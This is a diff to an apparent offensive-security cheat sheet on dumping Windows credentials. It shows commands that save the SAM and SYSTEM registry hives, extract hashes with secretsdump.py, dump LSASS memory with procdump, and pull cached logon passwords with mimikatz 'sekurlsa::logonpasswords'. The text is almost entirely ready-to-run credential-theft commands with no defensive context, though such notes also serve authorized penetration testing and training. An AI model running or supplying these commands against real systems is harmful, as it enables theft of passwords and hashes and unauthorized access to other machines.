@@ -38,10 +38,13 @@ reg save HKLM\system C:\users\Administrator\Desktop\system-reg
 secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
 ```
 
-# 5-Dump LSASS:
+# 5-Dump LSASS(cached credentials):
   - 5.1-Using GUI with Task-Manager
   - 5.2-Using procdump
-    ```
-      procdump.exe -accepteula -ma lsass.exe c:\<somewhere>
-    ```
+  ```
+  procdump.exe -accepteula -ma lsass.exe c:\<somewhere>
+  ```
   - 5.3-mimikatz
+  ```
+  mimikatz # sekurlsa::logonpasswords
+  ```
